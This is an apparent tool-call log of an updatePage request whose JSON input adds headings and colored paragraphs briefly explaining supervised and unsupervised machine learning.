--- updatePage called at 2026-03-24T06:45:01.504Z ---
INPUT: {
  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
  "blockType": "blocks",
  "data": [
    {
      "type": "heading",
      "props": {
        "level": 2
      },
      "content": "Supervised Learning"
    },
    {
      "type": "paragraph",
      "props": {
        "backgroundColor": "blue"
      },
      "content": "Supervised learning is a type of machine learning where an algorithm learns from labeled data. This means that each training example comes with an input and a corresponding correct output. The model learns to map inputs to outputs, and its goal is to predict the output for new, unseen inputs. Common tasks include classification (e.g., spam detection) and regression (e.g., predicting house prices)."
    },
    {
      "type": "heading",
      "props": {
        "level": 2
      },
      "content": "Unsupervised Learning"
    },
    {
      "type": "paragraph",
      "props": {
        "backgroundColor": "green"
      },
      "content": "Unsupervised learning is a type of machine learning that deals with unlabeled data. In this approach, the algorithm tries to find hidden patterns, structures, or relationships within the input data without any explicit guidance. There are no correct outputs provided during training. Common tasks include clustering (e.g., grouping customers by behavior) and dimensionality reduction (e.g., simplifying data for visualization)."
    }
  ]
}
